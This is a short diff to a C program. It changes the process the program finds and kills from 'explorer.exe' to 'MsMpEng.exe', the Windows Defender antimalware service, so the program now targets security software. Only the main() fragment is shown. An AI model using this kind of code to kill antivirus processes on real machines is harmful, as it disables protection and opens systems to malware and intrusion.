@@ -35,7 +35,7 @@
 }
 
 int main(int argc, char *argv[]) {
-	const char *processName = "explorer.exe"; //name of the proccess we want to kill
+	const char *processName = "MsMpEng.exe"; //name of the proccess we want to kill
     DWORD pid = getPID(processName);
 
     if (pid == 0) {
